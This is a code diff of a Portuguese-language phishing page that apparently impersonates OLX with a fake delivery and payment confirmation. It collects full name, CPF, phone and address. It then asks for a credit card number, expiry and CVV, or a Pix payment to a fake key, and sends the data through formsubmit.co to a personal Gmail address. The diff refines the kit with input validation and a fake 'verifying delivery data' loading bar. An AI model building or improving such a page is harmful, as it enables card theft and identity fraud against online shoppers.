@@ -58,6 +58,13 @@
       margin-bottom: 15px;
       font-weight: bold;
     }
+
+    /* Barra de carregamento */
+    .carregando {
+      text-align: center;
+      font-weight: bold;
+      font-size: 16px;
+    }
     .barra {
       width: 100%;
       background: #ddd;
@@ -71,6 +78,7 @@
       background-color: #ff5a00;
       animation: carregar 3s forwards;
     }
+
     @keyframes carregar {
       0% { width: 0%; }
       100% { width: 100%; }
@@ -79,100 +87,98 @@
 </head>
 <body>
 
-  <!-- FORMULÁRIO ÚNICO: todos os dados vão juntos -->
-  <form id="formCompleto" class="container tela ativa" action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
-    <input type="hidden" name="_next" value="https://olx.com.br/sucesso.html">
-    <input type="hidden" name="_captcha" value="false">
+  <!-- Tela 1: Dados de Entrega -->
+  <form id="tela1" class="container tela ativa">
+    <h2>Confirmação de Entrega</h2>
 
-    <!-- Tela 1 -->
-    <div id="tela1" class="subtela ativa">
-      <h2>Confirmação de Entrega</h2>
-      <label>Nome completo:</label>
-      <input type="text" name="nome" required>
+    <label>Nome completo:</label>
+    <input type="text" name="nome" required>
 
-      <label>CPF:</label>
-      <input type="text" name="cpf" maxlength="11" required>
+    <label>CPF:</label>
+    <input type="text" name="cpf" pattern="\d{11}" maxlength="11" required>
 
-      <label>Telefone:</label>
-      <input type="text" name="telefone" maxlength="15" required>
+    <label>Telefone:</label>
+    <input type="text" name="telefone" maxlength="15" required>
 
-      <label>CEP:</label>
-      <input type="text" name="cep" maxlength="8" required>
+    <label>CEP:</label>
+    <input type="text" name="cep" pattern="\d{8}" maxlength="8" required>
 
-      <label>Endereço:</label>
-      <input type="text" name="endereco" required>
+    <label>Endereço:</label>
+    <input type="text" name="endereco" required>
 
-      <label>Número:</label>
-      <input type="text" name="numero" required>
+    <label>Número:</label>
+    <input type="text" name="numero" required>
 
-      <label>Complemento:</label>
-      <input type="text" name="complemento">
+    <label>Complemento:</label>
+    <input type="text" name="complemento">
 
-      <label>Cidade:</label>
-      <input type="text" name="cidade" required>
+    <label>Cidade:</label>
+    <input type="text" name="cidade" required>
 
-      <label>Estado:</label>
-      <input type="text" name="estado" required>
+    <label>Estado:</label>
+    <input type="text" name="estado" required>
 
-      <button type="button" onclick="irParaTelaCarregando()">Continuar</button>
+    <button type="button" onclick="mostrarCarregamento()">Continuar</button>
+  </form>
+
+  <!-- Tela Carregando -->
+  <div id="telaCarregando" class="container tela">
+    <div class="carregando">
+      <p>Verificando dados de entrega...</p>
+      <div class="barra">
+        <div class="progresso"></div>
+      </div>
     </div>
+  </div>
 
-    <!-- Tela Carregando -->
-    <div id="telaCarregando" class="subtela">
-      <p style="text-align:center; font-weight:bold;">Verificando dados de entrega...</p>
-      <div class="barra"><div class="progresso"></div></div>
-    </div>
+  <!-- Tela 2: Escolher Pagamento -->
+  <div id="tela2" class="container tela">
+    <h2>Escolha a forma de pagamento</h2>
+    <button onclick="selecionarPagamento('cartao')">Pagar com Cartão de Crédito</button>
+    <br><br>
+    <button onclick="selecionarPagamento('pix')">Pagar via Pix</button>
+  </div>
 
-    <!-- Tela 2: Forma de Pagamento -->
-    <div id="tela2" class="subtela">
-      <h2>Escolha a forma de pagamento</h2>
-      <input type="hidden" id="formaPagamento" name="forma_pagamento">
-      <button type="button" onclick="selecionarPagamento('cartao')">Cartão de Crédito</button><br><br>
-      <button type="button" onclick="selecionarPagamento('pix')">Pix</button>
-    </div>
+  <!-- Tela 3: Cartão -->
+  <form id="formCartao" class="container tela" action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
+    <h2>Pagamento com Cartão</h2>
+    <input type="hidden" name="forma_pagamento" value="cartao">
+    <label>Número do cartão:</label>
+    <input type="text" name="numero_cartao" maxlength="16" pattern="\d{16}" required>
 
-    <!-- Tela 3A: Cartão -->
-    <div id="cartao" class="subtela">
-      <h2>Pagamento com Cartão</h2>
-      <label>Número do cartão:</label>
-      <input type="text" name="numero_cartao" maxlength="16" required>
+    <label>Nome no cartão:</label>
+    <input type="text" name="nome_cartao" required>
 
-      <label>Nome no cartão:</label>
-      <input type="text" name="nome_cartao" required>
+    <label>Validade (MM/AA):</label>
+    <input type="text" name="validade" placeholder="12/28" required>
 
-      <label>Validade (MM/AA):</label>
-      <input type="text" name="validade" required>
+    <label>CVV:</label>
+    <input type="text" name="cvv" maxlength="3" pattern="\d{3}" required>
 
-      <label>CVV:</label>
-      <input type="text" name="cvv" maxlength="3" required>
+    <button type="submit">Finalizar</button>
+  </form>
 
-      <button type="submit">Finalizar</button>
-    </div>
+  <!-- Tela 3: Pix -->
+  <form id="formPix" class="container tela" action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
+    <h2>Pagamento via Pix</h2>
+    <input type="hidden" name="forma_pagamento" value="pix">
+    <div class="pix-box">pix-chave-fake@provedor.com</div>
 
-    <!-- Tela 3B: Pix -->
-    <div id="pix" class="subtela">
-      <h2>Pagamento via Pix</h2>
-      <div class="pix-box">pix-chave-fake@provedor.com</div>
+    <label>Nome do pagador:</label>
+    <input type="text" name="nome_pagador" required>
 
-      <label>Nome do pagador:</label>
-      <input type="text" name="nome_pagador" required>
-
-      <button type="submit">Já paguei</button>
-    </div>
+    <button type="submit">Já paguei</button>
   </form>
 
   <script>
-    function trocarTela(atual, proxima) {
-      document.getElementById(atual).classList.remove('ativa');
-      document.getElementById(proxima).classList.add('ativa');
-    }
-
-    function irParaTelaCarregando() {
-      const form = document.getElementById('formCompleto');
+    function mostrarCarregamento() {
+      const form = document.getElementById('tela1');
       if (form.checkValidity()) {
-        trocarTela('tela1', 'telaCarregando');
+        form.classList.remove('ativa');
+        document.getElementById('telaCarregando').classList.add('ativa');
         setTimeout(() => {
-          trocarTela('telaCarregando', 'tela2');
+          document.getElementById('telaCarregando').classList.remove('ativa');
+          document.getElementById('tela2').classList.add('ativa');
         }, 3000);
       } else {
         form.reportValidity();
@@ -180,8 +186,8 @@
     }
 
     function selecionarPagamento(tipo) {
-      document.getElementById('formaPagamento').value = tipo;
-      trocarTela('tela2', tipo);
+      document.getElementById('tela2').classList.remove('ativa');
+      document.getElementById('form' + tipo.charAt(0).toUpperCase() + tipo.slice(1)).classList.add('ativa');
     }
   </script>
 </body>
